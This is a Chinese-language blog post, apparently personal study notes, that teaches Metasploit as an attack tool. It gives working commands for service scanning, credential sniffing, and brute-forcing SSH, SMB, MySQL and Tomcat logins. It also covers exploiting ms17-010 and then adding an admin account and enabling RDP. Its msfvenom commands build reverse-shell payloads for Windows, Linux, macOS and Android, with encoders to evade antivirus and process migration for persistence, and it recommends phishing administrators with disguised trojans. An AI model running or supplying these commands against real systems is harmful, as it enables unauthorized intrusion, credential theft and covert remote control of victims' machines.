@@ -1,0 +1,789 @@
+<!DOCTYPE html>
+<html lang="zh-CN" color-mode="light">
+
+  <head>
+  <meta charset="utf-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1" />
+  <meta name="keywords" content="" />
+  <meta name="author" content="ZeroRestart" />
+  <meta name="description" content="" />
+  
+  
+  <title>
+    
+      msf使用 
+      
+      
+      |
+    
+     ZeroRestart&#39;s Blog
+  </title>
+
+  
+    <link rel="apple-touch-icon" href="/images/favicon.ico">
+    <link rel="icon" href="/images/favicon.ico">
+  
+
+  <!-- Raleway-Font -->
+  <link href="https://fonts.googleapis.com/css?family=Raleway&display=swap" rel="stylesheet">
+
+  <!-- hexo site css -->
+  
+<link rel="stylesheet" href="/css/color-scheme.css">
+<link rel="stylesheet" href="/css/base.css">
+<link rel="stylesheet" href="/iconfont/iconfont.css">
+<link rel="stylesheet" href="/css/github-markdown.css">
+<link rel="stylesheet" href="/css/highlight.css">
+<link rel="stylesheet" href="/css/comments.css">
+
+
+  <!-- jquery3.3.1 -->
+  <script src="https://cdn.bootcss.com/jquery/3.3.1/jquery.min.js"></script>
+
+  <!-- fancybox -->
+  <link href="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.css" rel="stylesheet">
+  <script async src="https://cdn.bootcss.com/fancybox/3.5.2/jquery.fancybox.min.js"></script>
+  
+<script src="/js/fancybox.js"></script>
+
+
+  
+
+  <script>
+    var html = document.documentElement
+    const colorMode = localStorage.getItem('color-mode')
+    if (colorMode) {
+      document.documentElement.setAttribute('color-mode', colorMode)
+    }
+  </script>
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+
+
+  <body>
+    <div id="app">
+      <div class="header">
+  <div class="avatar">
+    <a href="/">
+      <!-- 头像取消懒加载，添加no-lazy -->
+      
+        <img src="/images/avatar.png" alt="">
+      
+    </a>
+    <div class="nickname"><a href="/">ZeroRestart</a></div>
+  </div>
+  <div class="navbar">
+    <ul>
+      
+        <li class="nav-item" data-path="/">
+          <a href="/">Home</a>
+        </li>
+      
+        <li class="nav-item" data-path="/archives/">
+          <a href="/archives/">Archives</a>
+        </li>
+      
+        <li class="nav-item" data-path="/tags/">
+          <a href="/tags/">Tags</a>
+        </li>
+      
+        <li class="nav-item" data-path="/friends/">
+          <a href="/friends/">Friends</a>
+        </li>
+      
+        <li class="nav-item" data-path="/about/">
+          <a href="/about/">About</a>
+        </li>
+      
+    </ul>
+  </div>
+</div>
+
+
+<script src="/js/activeNav.js"></script>
+
+
+
+      <div class="flex-container">
+        <!-- 文章详情页，展示文章具体内容，url形式：https://yoursite/文章标题/ -->
+<!-- 同时为「标签tag」，「朋友friend」，「分类categories」，「关于about」页面的承载页面，具体展示取决于page.type -->
+
+<!-- LaTex Display -->
+<script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+<script type="text/javascript" id="MathJax-script" async
+  src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-chtml.js">
+</script>
+<script>
+MathJax = {
+  tex: {
+    inlineMath: [['$', '$'], ['\\(', '\\)']]
+  }
+};
+</script>
+
+
+
+  
+
+  
+
+  
+
+  
+  <!-- 文章内容页 url形式：https://yoursite/文章标题/ -->
+  <div class="container post-details" id="post-details">
+    <div class="post-content">
+      <div class="post-title">msf使用</div>
+      <div class="post-attach">
+        <span class="post-pubtime">
+          <i class="iconfont icon-updatetime" title="更新时间"></i>
+          2021-12-28 22:08:00
+        </span>
+        
+              <span class="post-tags">
+                <i class="iconfont icon-tags" title="标签"></i>
+                
+                <span class="span--tag">
+                  <a href="/tags/%E5%AD%A6%E4%B9%A0%E7%AC%94%E8%AE%B0/" title="学习笔记">
+                    <b>#</b> 学习笔记
+                  </a>
+                </span>
+                
+              </span>
+          
+      </div>
+      <div class="markdown-body">
+        <h3 id="msf基本术语"><a href="#msf基本术语" class="headerlink" title="msf基本术语"></a>msf基本术语</h3><ul>
+<li><p><strong>渗透攻击</strong>（exploit）</p>
+<p>利用系统、程序、或者服务漏洞进行攻击的一个过程</p>
+</li>
+<li><p><strong>攻击载荷</strong> （payload）</p>
+<p>相当于<em><strong>木马</strong></em>，攻击者在目标系统上执行一段代码，改代码具有反弹连接，创建用户执行其它系统命令的功能</p>
+</li>
+<li><p><strong>模块</strong> （module）</p>
+<p>是指Metasploit框架中所使用的一段软件代码组件。</p>
+</li>
+<li><p><strong>监听器</strong> （listen）</p>
+<p>用来等待介入网络连接的组件 （为了建立木马连接）</p>
+</li>
+</ul>
+<h3 id="msf信息收集"><a href="#msf信息收集" class="headerlink" title="msf信息收集"></a>msf信息收集</h3><h4 id="端口扫描模块"><a href="#端口扫描模块" class="headerlink" title="端口扫描模块"></a>端口扫描模块</h4><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search portscan // 查看有哪些可用模块</span><br><span class="line">use 5 // 使用模块</span><br><span class="line">show options // 查看设置信息</span><br><span class="line">set rhosts 主机ip // 设置扫描的主机ip</span><br><span class="line">set threads 10 // 设置进程</span><br><span class="line">set port 80,445,8000-8100,3389 //设置端口</span><br><span class="line">run // 执行</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/68187bab8c0f45d63d2856d27913f81c607add93.png" alt="image-20211212173619606"></p>
+<p><img src="https://i0.hdslb.com/bfs/album/fdbaa2296fc4c38af441b156d23fe423c5aedb30.png" alt="image-20211212174045511"></p>
+<p><img src="https://i0.hdslb.com/bfs/album/8710810ee262e08703271fb10e40465b65341f8d.png" alt="image-20211212174026145"></p>
+<h3 id="特定服务扫描"><a href="#特定服务扫描" class="headerlink" title="特定服务扫描"></a>特定服务扫描</h3><h5 id="smb版本探测"><a href="#smb版本探测" class="headerlink" title="smb版本探测"></a>smb版本探测</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search smb_version </span><br><span class="line">use 0 </span><br><span class="line">show options </span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/9639025960d4b05cc9d0efb43daccc549fb7729d.png" alt="image-20211212174450658"></p>
+<h5 id="探测mssql主机"><a href="#探测mssql主机" class="headerlink" title="探测mssql主机"></a>探测mssql主机</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search mssql_ping </span><br><span class="line">use 0 </span><br><span class="line">show options</span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/dd4d2243757324a6a3a47107e9b90e70b72a1a6c.png" alt="image-20211212174753145"></p>
+<h5 id="探测ssh服务"><a href="#探测ssh服务" class="headerlink" title="探测ssh服务"></a>探测ssh服务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search ssh_version</span><br><span class="line">use 3</span><br><span class="line">show options</span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/a13c5043b07d9de25c529bd6d2442f2e5bd748c1.png" alt="image-20211212175353006"></p>
+<h5 id="探测telnet-服务"><a href="#探测telnet-服务" class="headerlink" title="探测telnet 服务"></a>探测telnet 服务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search telnet_version</span><br><span class="line">use 1</span><br><span class="line">show options</span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/81639d4f2ce5f35922e8dbdc39683c53d55bdc32.png" alt="image-20211212180554118"></p>
+<h5 id="探测FTP服务"><a href="#探测FTP服务" class="headerlink" title="探测FTP服务"></a><strong>探测FTP服务</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search ftp_version</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/f7d1cd04d32f725a93e72773d40044d799eada40.png" alt="image-20211213165006930"></p>
+<h5 id="扫FTP匿名登录"><a href="#扫FTP匿名登录" class="headerlink" title="扫FTP匿名登录"></a><strong>扫FTP匿名登录</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search ftp/anonymous</span><br><span class="line">use 0</span><br><span class="line">show options </span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="扫描局域网内存活的主机"><a href="#扫描局域网内存活的主机" class="headerlink" title="扫描局域网内存活的主机"></a><strong>扫描局域网内存活的主机</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search arp_sweep</span><br><span class="line">show option</span><br><span class="line">set rhost 192.168.8.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/a43e73ebc8e1f6359461048af00d078c6b2b7c4d.png" alt="image-20211213183006930"></p>
+<h5 id="扫描网站目录"><a href="#扫描网站目录" class="headerlink" title="扫描网站目录"></a>扫描网站目录</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search dir_scanner</span><br><span class="line">show options </span><br><span class="line">set rhosts 目标站点ip</span><br><span class="line">set rport 目标站点端口</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/76e405256808ab7f306ea2ca250135a345a02d62.png" alt="image-20211213184330280"></p>
+<h5 id="探测网站email地址"><a href="#探测网站email地址" class="headerlink" title="探测网站email地址"></a>探测网站email地址</h5><blockquote>
+<p>获取邮箱可以对管理员进行钓鱼，发送伪装好的木马程序（如：world）。 </p>
+<p>还可以去社工库匹配是否存在此邮箱的密码</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search seach_email</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set domain 网站域名</span><br><span class="line">run </span><br></pre></td></tr></table></figure>
+
+<p>(ps:这里需要代理，因为会使用google搜索邮箱)  <a target="_blank" rel="noopener" href="https://www.cnblogs.com/ananing/p/13657947.html">kali设置代理</a>  设置msf代理 修改proxychains4.conf  这个文件最下面 修改scoks5 为本机的v2ray 代理</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">proxychains4 msfconsole 启动msf</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/6d2773eb336016e8595870463f8e637b0d09f429.png" alt="image-20211215213617618"> </p>
+<h5 id="psnuffle嗅探"><a href="#psnuffle嗅探" class="headerlink" title="psnuffle嗅探"></a>psnuffle嗅探</h5><blockquote>
+<p>截获常见协议下的ftp、imap、pop3、smb、url等身份认证过程，记录用户名和密码（同一网段下）</p>
+</blockquote>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">search psnuffle</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/2ae0da8a14adec98ba983aa742c8375377ef2b70.png" alt="image-20211215194406035"></p>
+<h3 id="msf暴力破解"><a href="#msf暴力破解" class="headerlink" title="msf暴力破解"></a>msf暴力破解</h3><h5 id="ssh服务"><a href="#ssh服务" class="headerlink" title="ssh服务"></a>ssh服务</h5><p>ssh  21端口</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search ssh_login </span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set rhosts ip</span><br><span class="line">set pass_file 字典地址</span><br><span class="line">set user_file 用户地址</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/743943e55ae1afe949da3670f3ad09a7f972d712.png" alt="image-20211218223536595"></p>
+<p>这里 可以看到ssh 爆破成功，并且msf自动建立了一个会话</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">sessions -l //查看会话列表</span><br><span class="line">sessios -i id //使用会话</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/397a7bd1852b29cd1332fc9311678ee79dc004d7.png" alt="image-20211218224115762"></p>
+<h5 id="ftp服务"><a href="#ftp服务" class="headerlink" title="ftp服务"></a>ftp服务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search ftp_losgin</span><br><span class="line">use 0</span><br><span class="line">show options </span><br><span class="line">set rhosts ip</span><br><span class="line">set pass_file/user_file 字典 // 分别设置用户、密码字典</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/e2142cbd4c8abcfdff5bd21fd0c93fb840cea9c7.png" alt="image-20211218224526248"></p>
+<h5 id="mysql服务"><a href="#mysql服务" class="headerlink" title="mysql服务"></a>mysql服务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search mysql_login</span><br><span class="line">use 0</span><br><span class="line">show options</span><br><span class="line">set rhosts ip</span><br><span class="line">set pass_file/user_file 字典 // 分别设置用户、密码字典</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/8523c94cb690d3f63aa485b4f3a5e737a939e7f1.png" alt="image-20211218225035597"></p>
+<h5 id="postgresql服务"><a href="#postgresql服务" class="headerlink" title="postgresql服务"></a>postgresql服务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search postgresql</span><br><span class="line">use 7</span><br><span class="line">show options</span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/7af04d63ed7f92b3053515d4f1d32d110c7f767f.png" alt="image-20211218225243853"></p>
+<h5 id="tomcat-服务"><a href="#tomcat-服务" class="headerlink" title="tomcat 服务"></a>tomcat 服务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search tomcat_mgr_login</span><br><span class="line">use  0</span><br><span class="line">show options </span><br><span class="line">set rport 端口号 // 指如果修改端口的情况下使用 默认8080</span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/32b042461fbaca3b92fb47a655f429dc28f28504.png" alt="image-20211218225758722"></p>
+<p>拿到tomcat账户密码之后可以登录 —–&gt; 上传war包（包含jsp木马） —-&gt; getshell </p>
+<h5 id="telnet服务"><a href="#telnet服务" class="headerlink" title="telnet服务"></a>telnet服务</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">search telnet_login</span><br><span class="line">use 0</span><br><span class="line">show options </span><br><span class="line">set rhosts ip</span><br><span class="line">set user_file/pass_file 字典//分别设置用户名密码字典</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><strong>telnet = samba = rdp = 系统账户</strong></p>
+<h5 id="samba服务"><a href="#samba服务" class="headerlink" title="samba服务"></a>samba服务</h5><blockquote>
+<p>samba <strong><u>比telnet爆破快</u><strong>，而且都是系统账户。 如果</strong>开启smb 服务优先选择爆破此服务</strong></p>
+</blockquote>
+<p>msf 爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">search smb_login</span><br><span class="line">use 0</span><br><span class="line">show options </span><br><span class="line">set rhosts ip</span><br><span class="line">set pass_file 字典</span><br><span class="line">set user_file 字典</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/1dd5401c715b0597c5b825cbca5e6ffb043fb7c7.png" alt="image-20211218233214024"></p>
+<p>hydra 爆破</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hydra -l 用户名 -P 密码 smb://ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/8f783507fcc40246f2ed93bf74d64ad0a56dc1d3.png" alt="image-20211218232423887">smb 爆破出系统账户，但是rdp，telnet都没有开启  </p>
+<p>smb撑死就能执行映射命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">net use k:\\ip\c$</span><br></pre></td></tr></table></figure>
+
+<p>但是可以借助<strong>psexec.exe</strong>(微软自带的工具) 进行调用cmd, 从而执行更多系统命令</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">psexec.exe \\ip -l 账户 -p 密码 cmd.exe</span><br></pre></td></tr></table></figure>
+
+
+
+<h3 id="msf漏洞利用模块"><a href="#msf漏洞利用模块" class="headerlink" title="msf漏洞利用模块"></a>msf漏洞利用模块</h3><h5 id="对内网存活的主机进行探测"><a href="#对内网存活的主机进行探测" class="headerlink" title="对内网存活的主机进行探测"></a>对内网存活的主机进行探测</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search arp_sw</span><br><span class="line">use 0</span><br><span class="line">show options </span><br><span class="line">set rhosts 192.168.8.0/24</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<h5 id="smb漏洞"><a href="#smb漏洞" class="headerlink" title="smb漏洞"></a>smb漏洞</h5><p>nmap对主机进行 smb漏洞扫描</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">nmap --script smb-vuln-* ip</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/16fe20c4e3ee169489b32ba0077c3f4598dc39c2.png" alt="image-20211219142741661"></p>
+<p>ms17-010 永恒之蓝 (远程代码执行)</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">search ms17_010</span><br><span class="line">use 0</span><br><span class="line">show options </span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br><span class="line"></span><br><span class="line">//通过shell对系统进行控制</span><br><span class="line">net user 用户 密码 /add 添加系统账户</span><br><span class="line">net localgroup administrator 用户 /add 添加管理员组</span><br><span class="line">REG ADD HKLM\SYSTEM\CurrentControlSet\Control\Terminal&quot; &quot;Server /v fDenyTSConnections /t REG_DWORD /d 0 /f  开启3389</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/f5190221897ebbf104104920a3ef01428d1ac021.png" alt="image-20211219142947212"></p>
+<h5 id="ms12-020-RDP-蓝屏"><a href="#ms12-020-RDP-蓝屏" class="headerlink" title="ms12-020 RDP 蓝屏"></a>ms12-020 RDP 蓝屏</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">search ms12_020</span><br><span class="line">use 1</span><br><span class="line">show options </span><br><span class="line">set rhosts ip</span><br><span class="line">run</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://i0.hdslb.com/bfs/album/5b01a54e3f847dd44ecb4526712d594895b0b24e.png" alt="image-20211219141800962"></p>
+<h3 id="msf-payload模块"><a href="#msf-payload模块" class="headerlink" title="msf payload模块"></a>msf payload模块</h3><h5 id="msfvenom"><a href="#msfvenom" class="headerlink" title="msfvenom"></a>msfvenom</h5><blockquote>
+<p>msfvenom是msfpayload和msfencode的结合体，于2015年6月8日取代了msfpayload和msfencode。在此之后，metasploit-framework下面的的msfpayload（荷载生成器），msfencoder（编码器），msfcli（监听接口）都不再被支持。</p>
+</blockquote>
+<p>简单来说 就是用来生成payload 木马的</p>
+<h6 id="所有参数"><a href="#所有参数" class="headerlink" title="所有参数"></a><strong>所有参数</strong></h6><p><img src="https://i0.hdslb.com/bfs/album/4d4ab4ef27d61a632abdb500185ae5c5dee36321.png" alt="image-20211220171725952"></p>
+<h6 id="常用参数"><a href="#常用参数" class="headerlink" title="常用参数"></a><strong>常用参数</strong></h6><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p payload --list-optoins //查看此payload支持什么平台，有哪些选项</span><br><span class="line">msfvenom --list payload/encoders/nops/platforms/archs/formats //指定功能进行查看</span><br><span class="line">				payload 木马</span><br><span class="line">				encoders 编码器</span><br><span class="line">				nops 为payload添加空值</span><br><span class="line">				platforms 指定payload平台</span><br><span class="line">				archs 指定payload架构（x86/64）</span><br><span class="line">				formats 指定文件输出格式</span><br><span class="line">msfvenom -p payload -i 14 lhost=本机ip lport=端口 -f exe -o shell.exe // -i为编码次数（11-17最佳）</span><br></pre></td></tr></table></figure>
+
+
+
+<p>查看此payload支持什么平台、有哪些选项 </p>
+<p> <code>msfvenom -p windows/meterpreter/reverse_tcp --list-options</code></p>
+<p><img src="https://i0.hdslb.com/bfs/album/4c4057d2ee78e7f6f6a27cbf934b660589d76472.png" alt="image-20211220184005176"></p>
+<p>查看所有payload</p>
+<p><code>msfvenom --list payload</code></p>
+<p><img src="https://i0.hdslb.com/bfs/album/cab13671d6d6802436ab98e93b2e9dcceef9a7c5.png" alt="image-20211220184124810"></p>
+<p>查看所有编码器（用来bypass av）</p>
+<p><code>msfvenom --list encoders</code>   //评级最高的两个 cmd/powershell_base64、x86/shikata_ga_nai(动态编码，免杀中使用频率最高的一个编码器)  </p>
+<p><img src="https://i0.hdslb.com/bfs/album/4a66eec8a47b6cae6f86051002ff796212751a86.png" alt="image-20211220184705833"></p>
+<h5 id="监听会话"><a href="#监听会话" class="headerlink" title="监听会话"></a><strong>监听会话</strong></h5><p><strong>防止假session</strong></p>
+<p>​    解决连上就断开的情况,防止假死和假session</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; set ExitOnSession false   </span><br></pre></td></tr></table></figure>
+
+<p><strong>防止sessions 意外退出</strong></p>
+<p>​    解决会话5分钟内没有任何操作，会被自动杀掉的情况</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set SessionCommunicationTimeout 0  </span><br></pre></td></tr></table></figure>
+
+<p><strong>session 永不关闭</strong></p>
+<p>​    默认情况下，一星期会话会被强制关闭，设置0 可永久不会关闭</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf5 exploit(multi/handler) &gt; set SessionExpirationTimeout 0 </span><br></pre></td></tr></table></figure>
+
+
+
+<h5 id="handler后台持续监听"><a href="#handler后台持续监听" class="headerlink" title="handler后台持续监听"></a>handler后台<strong>持续监听</strong></h5><p>​    一般情况下建立一个会话后会自动关闭监听，使用以下指令*<u>可以始终保持监听</u>*</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msf exploit(multi/handler) &gt; exploit -j -z  //-j 为后台监听 -z 为持续监听 使用jobs查看和管理进程，jobs -k 杀死进程</span><br></pre></td></tr></table></figure>
+
+<p>​    也可以在msf下直接使用</p>
+<p><code>handler -H 192.168.8.124 -P 1122 -p windows/meterpreter/reverse_tcp</code></p>
+<h5 id="payload-可持续化"><a href="#payload-可持续化" class="headerlink" title="payload 可持续化"></a>payload 可持续化</h5><p>​    一般payload会单独启用进程，但是这种进程很容易被发现，关闭。 为了刚好的持续化可以使用</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">migrate pid //进程迁移</span><br></pre></td></tr></table></figure>
+
+<p>迁移进程后，默认进程会自动关闭</p>
+<p>​    msfvenom 生成payload时，添加让它允许后自动迁移 进程</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=192.168.8.136 lport=1122 -e x86/shikata_ga_nai -b &quot;\x00&quot; -i 5 -a x86 --platform win PrependMigrate=true PrependMigratePorc=svhost.exe -f exe -o shell.exe</span><br></pre></td></tr></table></figure>
+
+<p>-p 攻击载荷 -e 编码器 -b 避免程序出现的字符 -i 编码次数 -a 系统版本 –platform 系统  -f 指定程序格式 -o 输出程序</p>
+<p><code>PrependMigrate=true PrependMigratePorc=svhost.exe</code>  使payload允许时，默认迁移到svhost.exe 这个进程 </p>
+<p><img src="https://i0.hdslb.com/bfs/album/e276dba3982614bd9d00eb2bed0ec3adbd1f5f9a.png" alt="image-20211220223842071"></p>
+<p>如果拿到shell，发现权限不是system，也可以使用进程迁移的方法，**<u>迁移到有system权限的进程下</u><em><em>。那么此时你的权限就是</em><u>system权限</u></em></p>
+<h5 id="各平台下生成payload"><a href="#各平台下生成payload" class="headerlink" title="各平台下生成payload"></a>各平台下生成payload</h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">Liunx </span><br><span class="line">msfvenom -p liunx/x86/meterpreter/reverse_tcp lhost=ip lport=端口 -f elf &gt; shell.elf</span><br><span class="line"></span><br><span class="line">Windows</span><br><span class="line">msfvenom -p windows/meterpreter/reverse_tcp lhost=ip lport=端口 -f exe &gt; shell.exe</span><br><span class="line"></span><br><span class="line">Mac</span><br><span class="line">msfvenom -p osx/x86/meterpreter/reverse_tcp lhost=ip lport=端口 -f macho &gt; shell.macho</span><br><span class="line"></span><br><span class="line">Android</span><br><span class="line">msfvenom -a dalvik -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 -f raw &gt; shell.apk</span><br><span class="line">msfvenom -p android/meterpreter/reverse_tcp LHOST=192.168.8.124 LPORT=1122 R &gt; test.apk</span><br><span class="line"></span><br></pre></td></tr></table></figure>
+
+
+
